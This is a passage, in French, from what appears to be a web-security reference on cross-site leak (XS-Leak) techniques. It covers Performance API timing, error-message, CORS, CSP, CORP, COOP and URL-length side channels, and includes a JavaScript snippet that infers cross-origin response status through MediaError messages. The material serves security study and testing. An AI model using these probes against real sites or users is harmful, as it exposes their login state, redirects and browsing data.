L'API de [`Performance`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) fournit un acc√®s aux informations li√©es aux performances am√©lior√©es par les donn√©es de l'API de [`Resource Timing`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API) qui fournit les chronom√©trages des requ√™tes r√©seau tels que la dur√©e, mais lorsque le serveur envoie un en-t√™te `Timing-Allow-Origin: *`, la taille du transfert et le temps de recherche de domaine sont √©galement fournis.\
Ces donn√©es peuvent √™tre consult√©es en utilisant [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ou [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName). Elles peuvent √©galement √™tre utilis√©es pour obtenir le temps d'ex√©cution en utilisant la diff√©rence de [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now), cependant cela semble √™tre moins pr√©cis pour une requ√™te Chrome car il ne fournit que les millisecondes.

Cette API peut √™tre utilis√©e pour mesurer le temps d'une requ√™te ou pour d√©tecter l'utilisation de X-Frame-Options car la page bloqu√©e ne sera pas ajout√©e √† l'objet `performance` dans Chrome.

### Fuite d'erreur

* **M√©thodes d'inclusion**: Frames, √âl√©ments HTML
* **Diff√©rence d√©tectable**: Code d'√©tat
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **R√©sum√©**: Une requ√™te qui entra√Æne des erreurs ne cr√©era pas d'entr√©e de chronom√©trage des ressources.
* **Exemple de code**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Il est possible de **diff√©rencier les codes d'√©tat de r√©ponse HTTP** car les requ√™tes qui conduisent √† une **erreur** ne cr√©ent pas d'entr√©e de performance.

### Erreur de rechargement de style

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Code d'√©tat
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **R√©sum√©**: En raison d'un bogue du navigateur, les requ√™tes qui entra√Ænent des erreurs sont charg√©es deux fois.
* **Exemple de code**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Dans la technique pr√©c√©dente, il a √©galement √©t√© identifi√© deux cas o√π des bugs du navigateur dans GC entra√Ænent le **chargement en double des ressources lorsqu'elles √©chouent √† se charger**. Cela se traduira par plusieurs entr√©es dans l'API de performance et peut donc √™tre d√©tect√©.
### Erreur de fusion de requ√™tes

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Code d'√©tat
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **R√©sum√©**: Les requ√™tes qui entra√Ænent une erreur ne peuvent pas √™tre fusionn√©es.
* **Exemple de code**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

La technique a √©t√© trouv√©e dans un tableau dans le document mentionn√©, mais aucune description de la technique n'a √©t√© trouv√©e. Cependant, vous pouvez trouver le code source qui le v√©rifie dans [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Fuite de page vide

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **R√©sum√©**: Les r√©ponses vides ne cr√©ent pas d'entr√©es de synchronisation des ressources.
* **Exemple de code**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Un attaquant peut d√©tecter si une requ√™te a abouti √† un corps de r√©ponse HTTP vide car les **pages vides ne cr√©ent pas d'entr√©e de performance dans certains navigateurs**.

### **Fuite XSS-Auditor**

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **R√©sum√©**: D√©tecte la pr√©sence d'√©l√©ments sp√©cifiques dans une page Web avec le XSS-Auditor dans SA.
* **Exemple de code**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Dans SA, il est possible de d√©tecter si le XSSAuditor a √©t√© d√©clench√© et ainsi de divulguer des informations sensibles. Le XSS-Auditor est une fonctionnalit√© int√©gr√©e de SA et GC (maintenant supprim√©e) con√ßue pour att√©nuer les attaques de script entre sites (XSS). En 2013, Braun et Heiderich \[7] ont montr√© que le XSS-Auditor peut √™tre utilis√© pour bloquer des scripts l√©gitimes avec de faux positifs. Bas√©s sur leur technique, les chercheurs exfiltrent des informations et d√©tectent un contenu sp√©cifique sur une page d'origine crois√©e. Ces XS-Leaks ont √©t√© d√©crits pour la premi√®re fois dans un rapport de bogue par Terada, puis dans un article de blog par Heyes. Cependant, les techniques d√©couvertes s'appliquent uniquement au XSS-Auditor dans GC et ne fonctionnent pas dans SA. Nous avons constat√© que les pages bloqu√©es ne cr√©ent pas d'entr√©es d'API de performance. Cela signifie qu'un attaquant peut toujours divulguer des informations sensibles avec le XSS-Auditor dans SA.

### Fuite X-Frame

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: En-t√™te
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **R√©sum√©**: Une ressource avec l'en-t√™te X-Frame-Options ne cr√©e pas d'entr√©e de synchronisation des ressources.
* **Exemple de code**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Si une page n'est **pas autoris√©e** √† √™tre **affich√©e** dans un **iframe**, elle ne cr√©e **pas d'entr√©e de performance**. Par cons√©quent, un attaquant peut d√©tecter l'en-t√™te de r√©ponse **`X-Frame-Options`**.\
La m√™me chose se produit si vous utilisez une balise **embed**.

### D√©tection de t√©l√©chargement

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: En-t√™te
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **R√©sum√©**: Les t√©l√©chargements ne cr√©ent pas d'entr√©es de synchronisation des ressources dans l'API de performance.
* **Exemple de code**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

De mani√®re similaire √† la fuite XS-Leak d√©crite, une **ressource qui est t√©l√©charg√©e** en raison de l'en-t√™te ContentDisposition ne cr√©e √©galement **pas d'entr√©e de performance**. Cette technique fonctionne dans tous les principaux navigateurs.

### Fuite de d√©marrage de redirection

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: Redirection
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **R√©sum√©**: L'entr√©e de synchronisation des ressources divulgue l'heure de d√©marrage d'une redirection.
* **Exemple de code**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Nous avons trouv√© une instance de XS-Leak qui exploite le comportement de certains navigateurs qui enregistrent trop d'informations pour les requ√™tes entre origines diff√©rentes. La norme d√©finit un sous-ensemble d'attributs qui doivent √™tre d√©finis √† z√©ro pour les ressources entre origines diff√©rentes. Cependant, dans **SA**, il est possible de d√©tecter si l'utilisateur est **redirig√©** par la page cible, en interrogeant l'**API de performance** et en v√©rifiant les donn√©es de synchronisation **redirectStart**.

### Fuite de redirection de dur√©e

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: Redirection
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **R√©sum√©**: La dur√©e des entr√©es de synchronisation est n√©gative lorsqu'une redirection se produit.
* **Exemple de code**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Dans GC, la **dur√©e** des requ√™tes qui entra√Ænent une **redirection** est **n√©gative** et peut donc √™tre **distingu√©e** des requ√™tes qui n'entra√Ænent pas de redirection.
### Fuite CORP

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: En-t√™te
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **R√©sum√©**: Les ressources prot√©g√©es par CORP ne cr√©ent pas d'entr√©es de synchronisation des ressources.
* **Exemple de code**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Dans certains cas, l'entr√©e **nextHopProtocol** peut √™tre utilis√©e comme technique de fuite. Dans GC, lorsque l'en-t√™te **CORP** est d√©fini, le nextHopProtocol sera **vide**. Notez que SA ne cr√©era aucune entr√©e de performance pour les ressources activ√©es par CORP.

### Service Worker

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: Utilisation de l'API
* **Plus d'informations**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **R√©sum√©**: D√©tecter si un service worker est enregistr√© pour une origine sp√©cifique.
* **Exemple de code**:

Les service workers sont des contextes de script pilot√©s par des √©v√©nements qui s'ex√©cutent sur une origine. Ils s'ex√©cutent en arri√®re-plan d'une page Web et peuvent intercepter, modifier et **mettre en cache des ressources** pour cr√©er une application Web hors ligne.\
Si une **ressource mise en cache** par un **service worker** est acc√©d√©e via un **iframe**, la ressource sera **charg√©e √† partir du cache du service worker**.\
Pour d√©tecter si la ressource a √©t√© **charg√©e √† partir du cache du service worker**, l'API Performance peut √™tre utilis√©e.\
Cela peut √©galement √™tre fait avec une attaque de synchronisation (consultez le document pour plus d'informations).

### Cache

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: Timing
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **R√©sum√©**: D√©tecter si une ressource a √©t√© stock√©e dans le cache.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

En utilisant l'API Performance, il est possible de v√©rifier si une ressource est mise en cache.\
Pour plus d'informations : [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)

### Dur√©e du r√©seau

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **R√©sum√©**: Il est possible de r√©cup√©rer la dur√©e du r√©seau d'une requ√™te √† partir de l'API `performance`.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Technique des messages d'erreur

### Erreur de m√©dia

* **M√©thodes d'inclusion**: √âl√©ments HTML (Vid√©o, Audio)
* **Diff√©rence d√©tectable**: Code d'√©tat
* **Plus d'informations**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **R√©sum√©**: Dans FF, il est possible de divulguer avec pr√©cision le code d'√©tat d'une requ√™te entre origines.
* **Exemple de code**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
La propri√©t√© message de l'interface **`MediaError`** contient une **cha√Æne diff√©rente pour les ressources qui se chargent avec succ√®s**. Cela permet √† un attaquant d'inf√©rer l'√©tat de la r√©ponse pour une ressource en provenance d'un autre domaine.

### Erreur CORS

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: En-t√™te
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **R√©sum√©**: Dans les erreurs CORS SA, l'URL compl√®te des redirections est divulgu√©e.
* **Exemple de code**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Cette technique permet √† un attaquant de divulguer la cible d'une redirection initi√©e par un site d'origine diff√©rente.

CORS permet aux ressources web accessibles publiquement d'√™tre lues et utilis√©es √† partir de n'importe quel site web. Dans les navigateurs bas√©s sur Webkit, il est possible d'**acc√©der aux messages d'erreur CORS lorsque la requ√™te CORS √©choue**. Un attaquant peut envoyer une requ√™te activ√©e par CORS vers un site cible qui effectue des **redirections** en fonction de l'√©tat de l'utilisateur. Lorsque le navigateur refuse la requ√™te, l'**URL compl√®te de la cible de la redirection est divulgu√©e** dans le message d'erreur. Avec cette attaque, il est possible de d√©tecter les redirections, de divulguer les emplacements des redirections et les param√®tres de requ√™te sensibles.

### Erreur SRI

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: En-t√™te
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **R√©sum√©**: Dans les erreurs CORS SA, l'URL compl√®te des redirections est divulgu√©e.
* **Exemple de code**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un attaquant peut divulguer la taille des r√©ponses en provenance d'un autre domaine en raison de **messages d'erreur verbeux**.

L'attribut d'int√©grit√© d√©finit un hachage cryptographique permettant au navigateur de v√©rifier qu'une ressource r√©cup√©r√©e n'a pas √©t√© manipul√©e. Ce m√©canisme de s√©curit√© s'appelle l'int√©grit√© des sous-ressources (SRI). Il est utilis√© pour la v√©rification de l'int√©grit√© des ressources servies √† partir de r√©seaux de diffusion de contenu (CDN). Pour √©viter les fuites de donn√©es, les ressources en provenance d'un autre domaine doivent √™tre **activ√©es par CORS**. Sinon, la r√©ponse n'est pas √©ligible √† la validation de l'int√©grit√©. Tout comme l'erreur CORS XS-Leak, il est possible de capturer le **message d'erreur apr√®s une requ√™te fetch avec un attribut d'int√©grit√© qui √©choue**. Un attaquant peut provoquer **intentionnellement** cette **erreur** sur n'importe quelle requ√™te en sp√©cifiant une **valeur de hachage bidon**. Dans SA, ce message d'erreur divulgue la longueur du contenu de la ressource demand√©e. Un attaquant peut utiliser cette fuite pour d√©tecter les diff√©rences de taille de r√©ponse, ce qui permet des attaques XS-Leak puissantes.

### Violation/D√©tection de CSP

* **M√©thodes d'inclusion**: Pop-ups
* **Diff√©rence d√©tectable**: Code d'√©tat
* **Plus d'informations**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **R√©sum√©**: Si nous autorisons uniquement le site de la victime dans le CSP et qu'il tente de rediriger vers un domaine diff√©rent, le CSP d√©clenchera une erreur d√©tectable.
* **Exemple de code**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Un XS-Leak peut utiliser le CSP pour d√©tecter si un site d'origine diff√©rente a √©t√© redirig√© vers une autre origine. Cette fuite peut d√©tecter la redirection, mais en plus, le domaine de la cible de la redirection est divulgu√©. L'id√©e de base de cette attaque est de **permettre le domaine cible sur le site de l'attaquant**. Une fois une requ√™te √©mise vers le domaine cible, il **redirige** vers un domaine d'origine diff√©rente. Le CSP **bloque** l'acc√®s √† celui-ci et cr√©e un **rapport de violation utilis√© comme technique de fuite**. Selon le navigateur, **ce rapport peut divulguer l'emplacement cible de la redirection**.\
Les navigateurs modernes n'indiqueront pas l'URL vers laquelle la redirection a √©t√© effectu√©e, mais vous pouvez toujours d√©tecter qu'une redirection d'origine diff√©rente a √©t√© d√©clench√©e.

### Cache

* **M√©thodes d'inclusion**: Frames, Pop-ups
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **R√©sum√©**: Effacez le fichier du cache. Ouvre la page cible et v√©rifie si le fichier est pr√©sent dans le cache.
* **Exemple de code:**

Les navigateurs peuvent utiliser un cache partag√© pour tous les sites web. Ind√©pendamment de leur origine, il est possible de d√©duire si une page cible a **demand√© un fichier sp√©cifique**.

Si une page charge une image uniquement si l'utilisateur est connect√©, vous pouvez **invalider** la **ressource** (pour qu'elle ne soit plus mise en cache si elle l'√©tait, voir les liens pour plus d'informations), **effectuer une requ√™te** qui pourrait charger cette ressource et essayer de charger la ressource **avec une mauvaise requ√™te** (par exemple en utilisant un en-t√™te referer trop long). Si le chargement de la ressource **ne d√©clenche aucune erreur**, c'est parce qu'elle est **mise en cache**.

### Directive CSP

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: En-t√™te
* **Plus d'informations**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **R√©sum√©**: Les directives d'en-t√™te CSP peuvent √™tre sond√©es avec l'attribut CSP iframe.
* **Exemple de code**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Une nouvelle fonctionnalit√© dans GC permet aux pages web de proposer un CSP en d√©finissant un attribut sur un √©l√©ment iframe. Les directives de la politique sont transmises avec la requ√™te HTTP. Normalement, le contenu int√©gr√© doit explicitement autoriser cela avec un en-t√™te HTTP, **sinon une page d'erreur est affich√©e**. Cependant, si l'iframe contient d√©j√† un CSP et que la nouvelle politique n'est pas plus stricte, la page s'affichera normalement.

Cela permet √† un attaquant de d√©tecter une directive CSP sp√©cifique d'une page d'origine diff√©rente, s'il est possible de **d√©tecter la page d'erreur**. Bien que ce bogue soit maintenant marqu√© comme corrig√©, nous avons d√©couvert une **nouvelle technique de fuite qui peut d√©tecter la page d'erreur, car le probl√®me sous-jacent n'a jamais √©t√© r√©solu**.
### **CORP**

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: En-t√™te
* **Plus d'informations**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **R√©sum√©**: Une ressource prot√©g√©e par CORP g√©n√®re une erreur lorsqu'elle est r√©cup√©r√©e.
* **Exemple de code**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

L'en-t√™te CORP est une fonctionnalit√© de s√©curit√© relativement nouvelle de la plateforme web qui, lorsqu'elle est d√©finie, **bloque les requ√™tes cross-origin no-cors vers la ressource donn√©e**. La pr√©sence de l'en-t√™te peut √™tre d√©tect√©e, car une ressource prot√©g√©e par CORP **g√©n√©rera une erreur lorsqu'elle est r√©cup√©r√©e**.

### CORB

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: En-t√™tes
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **R√©sum√©**: CORB peut permettre aux attaquants de d√©tecter la pr√©sence de l'en-t√™te `nosniff` dans la requ√™te.
* **Exemple de code**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Consultez le lien pour plus d'informations sur l'attaque.

### Erreur CORS sur une mauvaise configuration de r√©flexion d'origine <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: En-t√™tes
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **R√©sum√©**: Si l'en-t√™te Origin est r√©fl√©chi dans l'en-t√™te `Access-Control-Allow-Origin`, il est possible de v√©rifier si une ressource est d√©j√† en cache.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Si l'en-t√™te **Origin** est **r√©fl√©chi** dans l'en-t√™te `Access-Control-Allow-Origin`, un attaquant peut exploiter ce comportement pour essayer de **r√©cup√©rer** la **ressource** en mode **CORS**. Si **aucune erreur** n'est d√©clench√©e, cela signifie qu'elle a √©t√© **correctement r√©cup√©r√©e depuis le web**. Si une erreur est d√©clench√©e, cela signifie qu'elle a √©t√© **acc√©d√©e depuis le cache** (l'erreur appara√Æt car le cache enregistre une r√©ponse avec un en-t√™te CORS autorisant le domaine d'origine et non le domaine de l'attaquant).\
Notez que si l'origine n'est pas r√©fl√©chie mais qu'un caract√®re g√©n√©rique est utilis√© (`Access-Control-Allow-Origin: *`), cela ne fonctionnera pas.

## Technique des attributs lisibles

### Redirection Fetch

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: Code d'√©tat
* **Plus d'informations**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **R√©sum√©**: GC et SA permettent de v√©rifier le type de r√©ponse (opaque-redirect) apr√®s la fin de la redirection.
* **Exemple de code**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

En soumettant une requ√™te √† l'aide de l'API Fetch avec `redirect: "manual"` et d'autres param√®tres, il est possible de lire l'attribut `response.type` et si celui-ci est √©gal √† `opaqueredirect`, alors la r√©ponse √©tait une redirection.

### COOP

* **M√©thodes d'inclusion**: Pop-ups
* **Diff√©rence d√©tectable**: En-t√™te
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **R√©sum√©**: Les pages prot√©g√©es par COOP ne peuvent pas √™tre acc√©d√©es.
* **Exemple de code**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Un attaquant peut d√©terminer si l'en-t√™te Cross-Origin Opener Policy (COOP) est disponible dans une r√©ponse HTTP cross-origin.

Les applications web peuvent d√©ployer l'en-t√™te de r√©ponse COOP pour emp√™cher d'autres sites web d'obtenir des r√©f√©rences de fen√™tre arbitraires vers l'application. Cependant, cet **en-t√™te peut √™tre facilement d√©tect√©** en essayant de lire la **r√©f√©rence `contentWindow`**. Si un site d√©ploie uniquement **COOP dans un √©tat**, cette propri√©t√© (`opener`) est **ind√©finie**, **sinon** elle est **d√©finie**.

### Longueur maximale de l'URL - C√¥t√© serveur

* **M√©thodes d'inclusion**: Fetch API, √âl√©ments HTML
* **Diff√©rence d√©tectable**: Code d'√©tat / Contenu
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **R√©sum√©**: D√©tecter les diff√©rences dans les r√©ponses en raison de la longueur de la r√©ponse de redirection qui peut √™tre trop grande, ce qui entra√Æne une erreur du serveur et la g√©n√©ration d'une alerte.
* **Exemple de code**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Si une redirection c√¥t√© serveur utilise **une entr√©e utilisateur dans la redirection** et **des donn√©es suppl√©mentaires**. Il est possible de d√©tecter ce comportement car les **serveurs** ont g√©n√©ralement une **limite de longueur de requ√™te**. Si les **donn√©es utilisateur** ont cette **longueur - 1**, car la **redirection** utilise **ces donn√©es** et **ajoute** quelque chose **en plus**, cela d√©clenchera une **erreur d√©tectable via les √©v√©nements d'erreur**.

Si vous pouvez d√©finir des cookies pour un utilisateur, vous pouvez √©galement effectuer cette attaque en **d√©finissant suffisamment de cookies** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) afin qu'avec la **taille accrue de la r√©ponse correcte**, une **erreur** soit d√©clench√©e. Dans ce cas, rappelez-vous que si vous d√©clenchez cette requ√™te √† partir d'un m√™me site, `<script>` enverra automatiquement les cookies (vous pouvez donc v√©rifier les erreurs).\
Un exemple de **cookie bomb + XS-Search** peut √™tre trouv√© dans la solution pr√©vue de cette explication : [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ou √™tre dans le m√™me contexte est g√©n√©ralement n√©cessaire pour ce type d'attaque.
### Longueur maximale de l'URL - C√¥t√© client

* **M√©thodes d'inclusion**: Pop-ups
* **Diff√©rence d√©tectable**: Code d'√©tat / Contenu
* **Plus d'informations**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **R√©sum√©**: D√©tectez les diff√©rences dans les r√©ponses en raison de la longueur de la r√©ponse de redirection qui peut √™tre trop grande pour une requ√™te o√π une diff√©rence peut √™tre remarqu√©e.
* **Exemple de code**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Selon la [documentation de Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), la longueur maximale de l'URL de Chrome est de 2 Mo.

> En g√©n√©ral, la _plateforme web_ n'a pas de limites sur la longueur des URL (bien que 2^31 soit une limite courante). _Chrome_ limite les URL √† une longueur maximale de **2 Mo** pour des raisons pratiques et pour √©viter de causer des probl√®mes de d√©ni de service dans la communication inter-processus.

Par cons√©quent, si l'URL de redirection r√©pond avec une taille plus grande dans l'un des cas, il est possible de la faire rediriger avec une **URL de plus de 2 Mo** pour atteindre la **limite de longueur**. Lorsque cela se produit, Chrome affiche une page **`about:blank#blocked`**.

La diff√©rence remarquable est que si la **redirection** a √©t√© **termin√©e**, `window.origin` g√©n√®re une **erreur** car une origine crois√©e ne peut pas acc√©der √† cette information. Cependant, si la **limite** a √©t√© atteinte et que la page charg√©e √©tait **`about:blank#blocked`**, l'**`origin`** de la fen√™tre reste celui du **parent**, ce qui est une information accessible.

Toutes les informations suppl√©mentaires n√©cessaires pour atteindre les **2 Mo** peuvent √™tre ajout√©es via un **hash** dans l'URL initiale afin qu'elles soient **utilis√©es dans la redirection**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### Nombre maximal de redirections

* **M√©thodes d'inclusion**: Fetch API, Frames
* **Diff√©rence d√©tectable**: Code d'√©tat
